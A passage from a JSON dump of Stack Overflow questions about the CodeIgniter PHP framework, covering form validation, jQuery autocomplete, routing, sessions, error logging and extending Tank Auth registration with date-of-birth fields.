solution to this problem because you're not going expect the users constantly click the reload button to check if the other user responded to their post.</p>\n\n<p>I came across the following js: </p>\n\n<pre><code>   &lt;meta http-equiv=\"refresh\" content=\"5\" /&gt; \n</code></pre>\n\n<p>The problem with this js though is it isn't really specific enough and if a user typing while the 5 sec parameter or a 30 sec parameter is met the user obviously looses what they were typing unless they get a chance to post before the forced browser refresh.</p>\n\n<p>Also came across the following CI_Output extension but didn't seem to solve my problem:</p>\n\n<pre><code>class MY_Output extends CI_Output \n{\n\n    function nocache()\n    {\n       $this-&gt;set_header('Expires: Sat, 26 Jul 1997 05:00:00 GMT');\n       $this-&gt;set_header('Cache-Control: no-cache, no-store, must-revalidate, max-age=0');\n       $this-&gt;set_header('Cache-Control: post-check=0, pre-check=0', FALSE);\n       $this-&gt;set_header('Pragma: no-cache');\n    }\n\n}\n</code></pre>\n\n<p>I'm really at a loss and not all that great at js and I'm not sure if js is the most efficient solution or if I should pursue server side. :-)</p>\n\n<p>Any help greatly appreciated :)</p>\n\n<p>Thanks so much!! :)</p>\n"},{"tags":["forms","validation","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":953,"score":0,"question_id":9160610,"title":"Extending form validation in Codeigniter","body":"<p>I have placed this class file called 'My_Form_validation.php' into 'application/core' and I have also tried placing it in 'application/libraries'.</p>\n\n<p>In my controller I am using </p>\n\n<pre><code>$this-&gt;form_validation-&gt;set_rules('user_postcode', 'Postcode', 'valid_postcode|trim|required|xss_clean');\n</code></pre>\n\n<p>This is whats in My_Form_validation.php - the actual logic is not in question here because I have a couple of options to actually validate the postcode. What I need help with is understanding why it is not loading or getting called!</p>\n\n<p>My CI version is \ndefine('CI_VERSION', '2.0.2');</p>\n\n<pre><code>&lt;?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\n/**\n * Form validation for UK Postcodes\n * \n * Check that its a valid postcode\n * @author James Mills &lt;james@koodoocreative.co.uk&gt;\n * @version 1.0\n * @package FriendsSavingMoney\n */\n\nclass MY_Form_validation extends CI_Form_validation\n{\n\n    function __construct()\n    {\n        parent::__construct();  \n        log_message('debug', '*** Hello from MY_Form_validation ***');\n    }\n\n    function valid_postcode($postcode)\n    {\n\n        /**\n         *\n         * UK Postcode validation expression from Wikipedia\n         * http://en.wikipedia.org/wiki/Postcodes_in_the_United_Kingdom\n         *\n         * Note: Remember to strtoupper() your postcode before inserting into database!\n         *\n         */\n\n        $pattern = \"/^(GIR 0AA)|(((A[BL]|B[ABDHLNRSTX]?|C[ABFHMORTVW]|D[ADEGHLNTY]|E[HNX]?|F[KY]|G[LUY]?|H[ADGPRSUX]|I[GMPV]|JE|K[ATWY]|L[ADELNSU]?|M[EKL]?|N[EGNPRW]?|O[LX]|P[AEHLOR]|R[GHM]|S[AEGKLMNOPRSTY]?|T[ADFNQRSW]|UB|W[ADFNRSV]|YO|ZE)[1-9]?[0-9]|((E|N|NW|SE|SW|W)1|EC[1-4]|WC[12])[A-HJKMNPR-Y]|(SW|W)([2-9]|[1-9][0-9])|EC[1-9][0-9]) [0-9][ABD-HJLNP-UW-Z]{2})$/\";\n\n\n        if (preg_match($pattern, strtoupper($postcode)))\n    {\n            return TRUE;\n        } \n        else\n        {\n            $this-&gt;set_message('valid_postcode', 'Please enter a valid postcode');\n            return FALSE;\n        }\n    }\n}\n</code></pre>\n"},{"tags":["php","javascript","jquery","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12402741,"title":"How to fit JSON data source to Jquery Autocomplete widget?","body":"<p>I want to use a Jquery UI- Autocomplete. \nHere is the method to use Autocomplete.</p>\n\n<pre><code>$(function() {\n    var availableTags = [\n        \"ActionScript\",\n        \"AppleScript\",\n        \"Asp\",\n        \"BASIC\",\n        \"C\",\n        \"C++\",\n        \"Clojure\",\n        \"COBOL\",\n        \"ColdFusion\",\n        \"Erlang\",\n        \"Fortran\",\n        \"Groovy\",\n        \"Haskell\",\n        \"Java\",\n        \"JavaScript\",\n        \"Lisp\",\n        \"Perl\",\n        \"PHP\",\n        \"Python\",\n        \"Ruby\",\n        \"Scala\",\n        \"Scheme\"\n    ];\n    $( \"#tags\" ).autocomplete({\n        source: availableTags\n    });\n});\n</code></pre>\n\n<p>Here the array \"availableTags\" is defined. But I want to generate the autocomplete from a data source which is a server-side script which returns JSON data.can anyone help me to fit that data source to autocomplete??</p>\n\n<p>Im using MVC architecture (Codeigniter) and using following method in controller to return the JSON data,</p>\n\n<pre><code>function supcode(){     \n    $dataarray=\"\";\n    $data=$this-&gt;Inventorymodel-&gt;supcode();\n    echo json_encode($data);\n}\n</code></pre>\n\n<p>And I am fetching the data in model using following function,</p>\n\n<pre><code>function supcode(){\n    $finresult=\"\";\n    $this-&gt;db-&gt;select('name');\n    $query = $this-&gt;db-&gt;get('supplier');\n    $result=$query-&gt;result_array();\n\n    foreach($result as $row){\n        $finresult[]=array(\n            'name' =&gt; $row['name']\n        );\n    }\n    return $finresult;\n}\n</code></pre>\n\n<p>And here is the URL to the function supcode in controller,\n\"index.php/inventory/supcode\"</p>\n\n<p>Thanks in advance.....</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12301988,"title":"Any a control panel for developers written in PHP for the CodeIgniter 2.0 framework like BackendPro?","body":"<p>I have installed Codeigniter 2.1.0 and i'm looking for Admin Panel PHP opensource. Thanks for your help.</p>\n"},{"tags":["php","codeigniter","nginx"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":99,"score":1,"question_id":12399094,"title":"Configuring MNPP nginx.conf to work with Codeigniter/PHP","body":"<p>I have a standard Codeigniter installation but can't seem to get <a href=\"http://getmnpp.org/\" rel=\"nofollow\">MNPP (MySQL+Nginx+PHP+Python)</a> to recognize it. I saw there is a codeigniter config in MNPP's common folder but can't get MNPP make use of those settings either.</p>\n\n<p>I've gotten my Codeigniter app to work using Nginx on an EC2 instance so its not a problem with my Codeigniter app.</p>\n\n<p>Also I can serve PHP pages, do MySQL and memcache on MNPP so those aren't the issue either. Might one suggest something to point me in the right direction?</p>\n\n<p>FYI, here's my MNPP /Applications/MNPP/conf/nginx/nginx.conf file: <a href=\"https://gist.github.com/3711660\" rel=\"nofollow\">https://gist.github.com/3711660</a>\nwhich for the sake of simplicity I have configured to ONLY include my /Applications/MNPP/conf/nginx/sites-enabled/default file : <a href=\"https://gist.github.com/3711653\" rel=\"nofollow\">https://gist.github.com/3711653</a></p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":135,"score":1,"question_id":12396699,"title":"Dynamic loading of a view in CodeIgniter","body":"<p>I am new to CI and wanted to get some feed back on my code and just get a feel of where my thought process is and if I am really getting my head wrapped around CI.</p>\n\n<p><strong>I have a file in my core directory called My_Controller which has this code:</strong></p>\n\n<pre><code>&lt;?php\n\nclass MY_Controller extends CI_Controller\n{\npublic function __construct()\n{\n    parent::__construct();\n\n    $this-&gt;data = array(\n        'title' =&gt; '',\n        'keywords' =&gt; 'default keywords',\n        'description' =&gt; 'default description',\n        'layout' =&gt; 'default',\n        'view' =&gt; '',\n        'body_class' =&gt; '',\n        'data' =&gt; array()\n    );\n}\n}\n</code></pre>\n\n<p><strong>I also have a controller called home in the controller directory with this code:</strong></p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Home extends MY_Controller\n{\nfunction __construct()\n{\n    parent::__construct();\n}\npublic function index()\n{\n    /*\n    Set variables to send to the wrapper template\n    Default values are stored in /application/core/MY_Controller.php\n    */\n\n    $this-&gt;data['title'] = 'Home';\n    $this-&gt;data['keywords'] = 'Home';\n    $this-&gt;data['description'] = 'Home';\n    $this-&gt;data['view'] = 'content/home';\n    $this-&gt;data['body_class'] = 'home';\n    $this-&gt;data['data'] = array(); // associative array of values you can pass to the view\n\n    $this-&gt;load-&gt;view('layout/default', $this-&gt;data);\n}\n}\n</code></pre>\n\n<p>**And finally I have a view named default which hold my header and footer info. Now I would like to dynamically load the correct content view depending on where I am in my site. This is what I have for my default view:</p>\n\n<pre><code>&lt;!doctype html&gt;\n&lt;!--[if IE 7]&gt;    &lt;html class=\"no-js ie7 oldie\" lang=\"en\"&gt; &lt;![endif]--&gt;\n&lt;!--[if IE 8]&gt;    &lt;html class=\"no-js ie8 oldie\" lang=\"en\"&gt; &lt;![endif]--&gt;\n&lt;!--[if gt IE 8]&gt;&lt;!--&gt; &lt;html class=\"no-js\" lang=\"en\"&gt; &lt;!--&lt;![endif]--&gt;\n&lt;head&gt;\n&lt;meta charset=\"utf-8\"&gt;\n&lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"&gt;\n\n&lt;title&gt;&lt;/title&gt;\n&lt;meta name=\"description\" content=\"\"&gt;\n&lt;meta name=\"author\" content=\"\"&gt;\n&lt;meta name=\"keywords\" content=\"\"&gt;\n\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n\n&lt;link rel=\"shortcut icon\" href=\"/favicon.ico\"&gt;\n&lt;link rel=\"apple-touch-icon\" href=\"/apple-touch-icon.png\"&gt;\n\n&lt;link rel=\"stylesheet\" href=\"/assets/css/reset.css\"&gt;\n&lt;link rel=\"stylesheet\" href=\"/assets/css/app.common.css\"&gt;\n\n&lt;script src=\"/assets/js/libs/modernizr-2.0.6.min.js\"&gt;&lt;/script&gt;\n\n&lt;/head&gt;\n\n&lt;body class=\"&lt;?php echo $body_class; ?&gt;\"&gt;\n&lt;div id=\"wrapper\"&gt;\n    &lt;div id=\"container\"&gt;\n        &lt;header id=\"header\"&gt;\n            &lt;nav&gt;\n                &lt;ul&gt;\n                    &lt;li&gt;\n                        &lt;a href=\"/\"&gt;Home&lt;/a&gt;\n                    &lt;/li&gt;\n                &lt;/ul&gt;\n            &lt;/nav&gt;\n        &lt;/header&gt;\n        &lt;section id=\"main\" role=\"main\"&gt;\n            &lt;?php echo $this-&gt;load-&gt;view($view); ?&gt;\n        &lt;/section&gt;\n        &lt;footer id=\"footer\"&gt;&lt;/footer&gt;\n    &lt;/div&gt; \n&lt;/div&gt;\n&lt;!--jQuery Libraries and Plugins--&gt;\n&lt;script src=\"//ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js\"&gt;&lt;/script&gt;\n&lt;script&gt;window.jQuery || document.write('&lt;script src=\"/js/libs/jquery-1.8.0.min.js\"&gt;&lt;\\/script&gt;')&lt;/script&gt;\n\n&lt;!--Other JavaScript Libraries and Plugins--&gt;\n\n&lt;script type=\"text/javascript\"&gt; // Change UA-XXXXX-X to be your site's ID\n  var _gaq = _gaq || [];\n  _gaq.push(['_setAccount', 'UA-XXXXX-X']);\n  _gaq.push(['_trackPageview']);\n\n  (function() {\n    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;\n    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';\n    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);\n  })();\n&lt;/script&gt;\n\n&lt;!--[if lt IE 9]&gt; \n    &lt;script src=\"/js/libs/selectivizr-1.0.2.min.js\"&gt;&lt;/script&gt;\n&lt;![endif]--&gt;        \n\n&lt;!--Application JavaScript--&gt;\n\n&lt;script src=\"js/app/app.common.js\"&gt;&lt;/script&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>I get the correct syntax from home.php but I also get these errors:</p>\n\n<p>** A PHP Error was encountered</p>\n\n<blockquote>\n  <p>Severity: Warning\n  Message: ob_start(): output handler 'ob_gzhandler' conflicts with\n  'zlib output compression'\n  Filename: core/Output.php\n  Line Number: 379**</p>\n</blockquote>\n\n<p>** A PHP Error was encountered</p>\n\n<blockquote>\n  <p>Severity: Notice\n  Message: ob_start(): failed to create buffer\n  Filename: core/Output.php\n  Line Number: 379**</p>\n</blockquote>\n\n<p>Can someone please tell me if I'm missing something or if this is just plain incorrect. </p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12348760,"title":"Codeigniter lost session when cross controllers","body":"<p>I created a Facebook login on my site, then when I get data of a user logged, I created an array session to store the information of users in my controller.</p>\n\n<p>I have problem with this session when I go to another page, my session gets lost, I don't know what happens with this?</p>\n\n<p>I set the session like this: <code>$this-&gt;session-&gt;set_userdata('fb_user_info', $user_info);</code></p>\n\n<p>But, my own account login, I do the same way, it works on all pages.</p>\n\n<p>My question is, Why does the session get lost?</p>\n\n<p>Here is my code to set session when get user_info</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\n\nclass Account extends CI_Controller {\n\npublic function __construct()\n{       \n    parent::__construct();\n    //$this-&gt;authenticate();\n\n    // Facebook constructor code\n        $CI = &amp; get_instance();\n        $CI-&gt;config-&gt;load(\"facebook\",TRUE);\n        $config = $CI-&gt;config-&gt;item('facebook');\n        $this-&gt;load-&gt;library('facebook', $config); \n    public function index() \n    {       \n        $user = $this-&gt;facebook-&gt;getUser();\n\n        if($user) {\n\n            try {\n\n                $user_info = $this-&gt;facebook-&gt;api('/me');\n\n        // Set session\n\n            $this-&gt;session-&gt;set_userdata('FB_SESSION_INFO', $user_info);\n\n                    $args = $logout_url;\n\n            $data['getLogoutUrl'] = $this-&gt;facebook-&gt;getLogoutUrl($args);\n\n        } catch(FacebookApiException $e) {\n                echo '&lt;pre&gt;'.htmlspecialchars(print_r($e, true)).'&lt;/pre&gt;';\n                $user = null;\n            }\n        } else {\n\n            $param = array('scope' =&gt; 'email','redirect_uri' =&gt; $mycurrent_url);\n\n            $data['getURLLogin'] = \"&lt;a href=\\\"\".$this-&gt;facebook-&gt;getLoginUrl($param).\"\\\"&gt;Login with facebook&lt;/a&gt;\";\n\n    }\n}\n</code></pre>\n"},{"tags":["php","codeigniter","logging"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":318,"score":1,"question_id":5250615,"title":"Upgraded to CodeIgniter 2.0, but now my php errors dont appear in the logs, what should I do?","body":"<p>OK, so I wrote an app using CodeIgniter 1.7.3 and everything was dandy.</p>\n\n<p>then i moved to CodeIgniter 2.0 and it all works fine, except now it doesn't display errors in my php_error.log</p>\n\n<p>so for example if i had a typo in a method name, I used to get something like: </p>\n\n<blockquote>\n  <p>[04-Feb-2011 16:20:01] PHP Fatal error:  Call to undefined method Some_controller::my_method() in /Applications/MAMP/htdocs/application/controllers/some_controller.php on line 61</p>\n</blockquote>\n\n<p>now i get nothing. just the 500 servlet exception in my browser window.</p>\n\n<p>So far ive checked my php.ini \nwhich has error_reporting  =  E_ALL and log_errors = On\nalso display_errors = On (even though i think this logs to the screen no the file)</p>\n\n<p>i just tried an intentional broken non-codeigniter php file and I do get an error in my log like:</p>\n\n<blockquote>\n  <p>[10-Mar-2011 02:47:02] PHP Fatal error:  Call to undefined function fake_method() in /Applications/MAMP/htdocs/test.php on line 2</p>\n</blockquote>\n\n<p>so it appears to only be codeigniter which doesnt log.</p>\n\n<p>my config/config.php has logging set like this: $config['log_threshold'] = 4;</p>\n\n<p>also index.php has error_reporting(E_ALL);</p>\n\n<p>Its such a pain to debug when I dont get line numbers...\nCan anyone else tell me what else I should change/check to get my logging back?</p>\n"},{"tags":["php","codeigniter","internationalization"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12397394,"title":"Codeigniter and i18n's 3rd segment","body":"<p>I have a problem about i18n-codeigniter integration. I integrated i18n my last project today. I had some custom routes before i18n. Now I changed them according to i18n route style. But I have some problem with 3rd segments.\nI mean, I have this routes:</p>\n\n<pre><code>$route['default_controller'] = \"welcome\";\n$route['404_override'] = '';\n\n$route['^(tr|en)/hakkimizda'] = 'Bilgi/Hakkimizda';\n$route['^(tr|en)/kampanyalar'] = 'Bilgi/Kampanyalar';\n$route['^(tr|en)/haberler'] = 'Haberler';\n$route['^(tr|en)/kampanyalar/(.+)$'] = 'Bilgi/Kampanyalar/$1';\n$route['^(tr|en)/haberler/(:any)'] = 'Haberler/HaberDetay/$1';\n$route['^(tr|en)/urunler'] = 'Urunler';\n$route['^(tr|en)/urunler/(:any)'] = 'Urunler/Detay/$1';\n$route['^(tr|en)/urunler/kategori/(:any)'] = 'Urunler/Kategori/$2';\n$route['^(tr|en)/kesif-talebi'] = \"Iletisim/Kesif_Talebi\";\n$route['^(tr|en)/iletisim'] = \"Iletisim\";\n$route['^tr$'] = $route['default_controller'];\n$route['^en'] = $route['default_controller'];\n</code></pre>\n\n<p>some links are working perfectly.When I enter to <a href=\"http://webadress.com/en/urunler\" rel=\"nofollow\">http://webadress.com/en/urunler</a> that is working perfect but when i enter <a href=\"http://webadress.com/en/urunler/kategori/parameter\" rel=\"nofollow\">http://webadress.com/en/urunler/kategori/parameter</a> that gives me blank page...</p>\n\n<p>How can i fix that problem?\nThank you all</p>\n"},{"tags":["php","codeigniter","tankauth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":134,"score":0,"question_id":12379703,"title":"CodeIgniter: Tank Auth, Adding Date of Birth Issues","body":"<p>Ok, So I have added a Date of Birth section for the registration process. I have done it in a weird way probably but it is a logical way to do it in my mind so as long as it works I am fine with it. I have created 3 dob fields (dob1, dob2, dob3 - for month, day, year). The problem I have right now is when a user registers the dob values are not stored properly into the database (it seems the values are just random, they show up as random numbers and letters). So I am curious as to what I am doing wrong. Here is what I have done.</p>\n\n<p>EDIT: I have found the problem, but still am looking for a solution. The ordering is mixed up somewhere. My first 2 letters of email go into dob1, first 2 letters of password go into dob2 (dont know if pass or confirm pass), dob1 goes to firstname, dob2 goes to lastnam, username is fine, dob3 goes to email. So I have mixed up the ordering of my array somewhere but I am nut sure where it counts.</p>\n\n<p>EDIT2: I have found my issue. Answer is below.</p>\n\n<p>Register function in controllers/auth.php</p>\n\n<pre><code>function register()\n        {\n                if ($this-&gt;tank_auth-&gt;is_logged_in()) {                                                                 // logged in\n                        redirect('');\n\n                } elseif ($this-&gt;tank_auth-&gt;is_logged_in(FALSE)) {                                              // logged in, not activated\n                        redirect('/auth/send_again/');\n\n                } elseif (!$this-&gt;config-&gt;item('allow_registration', 'tank_auth')) {    // registration is off\n                        $this-&gt;_show_message($this-&gt;lang-&gt;line('auth_message_registration_disabled'));\n\n                } else {\n                        $use_username = $this-&gt;config-&gt;item('use_username', 'tank_auth');\n                        if ($use_username) {\n                                $this-&gt;form_validation-&gt;set_rules('username', 'Username', 'trim|required|xss_clean|min_length['.$this-&gt;config-&gt;item('username_min_length', 'tank_auth').']|max_length['.$this-&gt;config-&gt;item('username_max_le\\\nngth', 'tank_auth').']|alpha_dash');\n                        }\n\n                        $this-&gt;form_validation-&gt;set_rules('dob1', 'DOB1', 'trim|required|xss_clean|min_length[2]|max_length[2]');\n                        $this-&gt;form_validation-&gt;set_rules('dob2', 'DOB2', 'trim|required|xss_clean|min_length[2]|max_length[2]');\n                        $this-&gt;form_validation-&gt;set_rules('dob3', 'DOB3', 'trim|required|xss_clean|min_length[2]|max_length[4]');\n                        $this-&gt;form_validation-&gt;set_rules('firstname', 'First Name', 'trim|xss_clean|min_length[2]|max_length[50]');\n                        $this-&gt;form_validation-&gt;set_rules('lastname', 'Last Name', 'trim|xss_clean|min_length[2]|max_length[50]');\n\n                        $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'trim|required|xss_clean|valid_email');\n                        $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'trim|required|xss_clean|valid_email|callback_is_email_domain[ku.edu]');\n                        $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'trim|required|xss_clean|min_length['.$this-&gt;config-&gt;item('password_min_length', 'tank_auth').']|max_length['.$this-&gt;config-&gt;item('password_max_length', '\\\ntank_auth').']|alpha_dash');\n                        $this-&gt;form_validation-&gt;set_rules('confirm_password', 'Confirm Password', 'trim|required|xss_clean|matches[password]');\n\n                        $captcha_registration   = $this-&gt;config-&gt;item('captcha_registration', 'tank_auth');\n                        $use_recaptcha                  = $this-&gt;config-&gt;item('use_recaptcha', 'tank_auth');\n                        if ($captcha_registration) {\n                                if ($use_recaptcha) {\n                                        $this-&gt;form_validation-&gt;set_rules('recaptcha_response_field', 'Confirmation Code', 'trim|xss_clean|required|callback__check_recaptcha');\n                                } else {\n                                        $this-&gt;form_validation-&gt;set_rules('captcha', 'Confirmation Code', 'trim|xss_clean|required|callback__check_captcha');\n                                }\n                        }\n                        $data['errors'] = array();\n\n                        $email_activation = $this-&gt;config-&gt;item('email_activation', 'tank_auth');\n\n                        if ($this-&gt;form_validation-&gt;run()) {                                                            // validation ok\n                                if (!is_null($data = $this-&gt;tank_auth-&gt;create_user(\n                                                $use_username ? $this-&gt;form_validation-&gt;set_value('username') : '',\n\n                                                $this-&gt;form_validation-&gt;set_value('dob1'),\n                                                $this-&gt;form_validation-&gt;set_value('dob2'),\n                                                $this-&gt;form_validation-&gt;set_value('dob3'),\n                                                $this-&gt;form_validation-&gt;set_value('firstname'),\n                                                $this-&gt;form_validation-&gt;set_value('lastname'),\n\n                                                $this-&gt;form_validation-&gt;set_value('email'),\n                                                $this-&gt;form_validation-&gt;set_value('password'),\n                                                $email_activation))) {                                                                  // success\n\n                                        $data['site_name'] = $this-&gt;config-&gt;item('website_name', 'tank_auth');\n\n                        $email_activation = $this-&gt;config-&gt;item('email_activation', 'tank_auth');\n\n                        if ($this-&gt;form_validation-&gt;run()) {                                                            // validation ok\n                                if (!is_null($data = $this-&gt;tank_auth-&gt;create_user(\n                                                $use_username ? $this-&gt;form_validation-&gt;set_value('username') : '',\n\n                                                $this-&gt;form_validation-&gt;set_value('dob1'),\n                                                $this-&gt;form_validation-&gt;set_value('dob2'),\n                                                $this-&gt;form_validation-&gt;set_value('dob3'),\n                                                $this-&gt;form_validation-&gt;set_value('firstname'),\n                                                $this-&gt;form_validation-&gt;set_value('lastname'),\n\n                                                $this-&gt;form_validation-&gt;set_value('email'),\n                                                $this-&gt;form_validation-&gt;set_value('password'),\n                                                $email_activation))) {                                                                  // success\n\n                                        $data['site_name'] = $this-&gt;config-&gt;item('website_name', 'tank_auth');\n\n                                        if ($email_activation) {                                                                        // send \"activate\" email\n                                                $data['activation_period'] = $this-&gt;config-&gt;item('email_activation_expire', 'tank_auth') / 3600;\n\n                                                $this-&gt;_send_email('activate', $data['email'], $data);\n\n                                                unset($data['password']); // Clear password (just for any case)\n\n                                                $this-&gt;_show_message($this-&gt;lang-&gt;line('auth_message_registration_completed_1'));\n\n                                        } else {\n                                                if ($this-&gt;config-&gt;item('email_account_details', 'tank_auth')) {        // send \"welcome\" email\n\n                                                        $this-&gt;_send_email('welcome', $data['email'], $data);\n                                                }\n                                                unset($data['password']); // Clear password (just for any case)\n\n                                                $this-&gt;_show_message($this-&gt;lang-&gt;line('auth_message_registration_completed_2').' '.anchor('/auth/login/', 'Login'));\n                                        }\n                                } else {\n                                        $errors = $this-&gt;tank_auth-&gt;get_error_message();\n                                        foreach ($errors as $k =&gt; $v)   $data['errors'][$k] = $this-&gt;lang-&gt;line($v);\n                                }\n                        }\n                        if ($captcha_registration) {\n                                if ($use_recaptcha) {\n                                        $data['recaptcha_html'] = $this-&gt;_create_recaptcha();\n                                } else {\n                                        $data['captcha_html'] = $this-&gt;_create_captcha();\n                                }\n                        }\n                        $data['use_username'] = $use_username;\n                        $data['captcha_registration'] = $captcha_registration;\n                        $data['use_recaptcha'] = $use_recaptcha;\n                        $this-&gt;load-&gt;view('auth/register_form', $data);\n                }\n        }\n</code></pre>\n\n<p>Libraries: Tank_Auth.php - I know this is not the whole dob, but calling this function returns nothing, i figure if I can return 1 dob then i can easily return them all. EDIT: I just realized I did not include all of my changes for this file.</p>\n\n<pre><code>else {  \n    $this-&gt;ci-&gt;session-&gt;set_userdata(array(     \n        'user_id'  =&gt; $user-&gt;id,    \n        'dob1'     =&gt; $user-&gt;dob1,\n        'dob2'     =&gt; $user-&gt;dob2,\n        'dob3'     =&gt; $user-&gt;dob3,\n        'firstname'  =&gt; $user-&gt;firstname,\n        'lastname'  =&gt; $user-&gt;lastname,   \n        'username'  =&gt; $user-&gt;username, \n        'status'  =&gt; ($user-&gt;activated == 1) ? STATUS_ACTIVATED : STATUS_NOT_ACTIVATED, \n\n         ));\n</code></pre>\n\n<p>.\n   .\n   .</p>\n\n<pre><code>function get_dob()\n        {\n                return $this-&gt;ci-&gt;session-&gt;userdata('dob1');\n        }\n</code></pre>\n\n<p>.\n.\n.</p>\n\n<pre><code>function create_user($username, $firstname, $lastname, $email, $password, $email_activation, $dob1, $dob2, $dob3)\n{\n    if ((strlen($username) &gt; 0) AND !$this-&gt;ci-&gt;users-&gt;is_username_available($username)) {\n        $this-&gt;error = array('username' =&gt; 'auth_username_in_use');\n        $hashed_password = $hasher-&gt;HashPassword($password);\n        $data = array(\n            'firstname' =&gt; $firstname,\n            'lastname' =&gt; $lastname,\n            'dob1' =&gt; $dob1,\n            'dob2' =&gt; $dob2,\n            'dob3' =&gt; $dob3,\n            'username' =&gt; $username,\n            'password' =&gt; $hashed_password,\n            'email' =&gt; $email,\n</code></pre>\n\n<p>Views: registration_form.php</p>\n\n<pre><code>&lt;?php\nif ($use_username) {\n        $username = array(\n                'name'  =&gt; 'username',\n                'id'    =&gt; 'username',\n                'value' =&gt; set_value('username'),\n                'maxlength'     =&gt; $this-&gt;config-&gt;item('username_max_length', 'tank_auth'),\n                'size'  =&gt; 30,\n        );\n}\n$email = array(\n        'name'  =&gt; 'email',\n        'id'    =&gt; 'email',\n        'value' =&gt; set_value('email'),\n        'maxlength'     =&gt; 80,\n        'size'  =&gt; 30,\n);\n$firstname = array(\n        'name'  =&gt; 'firstname',\n        'id'    =&gt; 'firstname',\n        'value' =&gt; set_value('firstname'),\n        'maxlength'     =&gt; 50,\n        'size'  =&gt; 30,\n);\n$lastname = array(\n        'name'  =&gt; 'lastname',\n        'id'    =&gt; 'lastname',\n        'value' =&gt; set_value('lastname'),\n        'maxlength'     =&gt; 50,\n        'size'  =&gt; 30,\n);\n$password = array(\n        'name'  =&gt; 'password',\n        'id'    =&gt; 'password',\n        'value' =&gt; set_value('password'),\n        'maxlength'     =&gt; $this-&gt;config-&gt;item('password_max_length', 'tank_auth'),\n        'size'  =&gt; 30,\n);\n$confirm_password = array(\n        'name'  =&gt; 'confirm_password',\n        'id'    =&gt; 'confirm_password',\n        'value' =&gt; set_value('confirm_password'),\n        'maxlength'     =&gt; $this-&gt;config-&gt;item('password_max_length', 'tank_auth'),\n        'size'  =&gt; 30,\n);\n$dob1 = array(\n        'name'  =&gt; 'dob1',\n        'id'    =&gt; 'dob1',\n        'value' =&gt; set_value('dob1'),\n        'maxlength'     =&gt; 2,\n        'size'  =&gt; 30,\n);\n$dob2 = array(\n        'name'  =&gt; 'dob2',\n        'id'    =&gt; 'dob2',\n        'value' =&gt; set_value('dob2'),\n        'maxlength'     =&gt; 2,\n        'size'  =&gt; 30,\n);\n$dob3 = array(\n        'name'  =&gt; 'dob3',\n        'id'    =&gt; 'dob3',\n        'value' =&gt; set_value('dob3'),\n        'maxlength'     =&gt; 4,\n        'size'  =&gt; 30,\n);\n$captcha = array(\n        'name'  =&gt; 'captcha',\n        'id'    =&gt; 'captcha',\n        'maxlength'     =&gt; 8,\n);\n?&gt;\n&lt;?php echo form_open($this-&gt;uri-&gt;uri_string()); ?&gt;\n&lt;table&gt;\n        &lt;?php if ($use_username) { ?&gt;\n        &lt;tr&gt;\n                &lt;td&gt;&lt;?php echo form_label('Username', $username['id']); ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo form_input($username); ?&gt;&lt;/td&gt;\n                &lt;td style=\"color: red;\"&gt;&lt;?php echo form_error($username['name']); ?&gt;&lt;?php echo isset($errors[$username['name']])?$errors[$username['name']]:''; ?&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;?php } ?&gt;\n        &lt;tr&gt;\n                &lt;td&gt;&lt;?php echo form_label('Email Address', $email['id']); ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo form_input($email); ?&gt;&lt;/td&gt;\n                &lt;td style=\"color: red;\"&gt;&lt;?php echo form_error($email['name']); ?&gt;&lt;?php echo isset($errors[$email['name']])?$errors[$email['name']]:''; ?&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n                &lt;td&gt;&lt;?php echo form_label('First Name', $firstname['id']); ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo form_input($firstname); ?&gt;&lt;/td&gt;\n                &lt;td style=\"color: red;\"&gt;&lt;?php echo form_error($firstname['name']); ?&gt;&lt;?php echo isset($errors[$firstname['name']])?$errors[$firstname['name']]:''; ?&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n                &lt;td&gt;&lt;?php echo form_label('Last Name', $lastname['id']); ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo form_input($lastname); ?&gt;&lt;/td&gt;\n                &lt;td style=\"color: red;\"&gt;&lt;?php echo form_error($lastname['name']); ?&gt;&lt;?php echo isset($errors[$lastname['name']])?$errors[$lastname['name']]:''; ?&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n        &lt;tr&gt;\n                &lt;td&gt;&lt;?php echo form_label('Password', $password['id']); ?&gt;&lt;/td&gt;\n                &lt;td&gt;&lt;?php echo form_password($password); ?&gt;&lt;/td&gt;\n                &lt;td style=\"color: 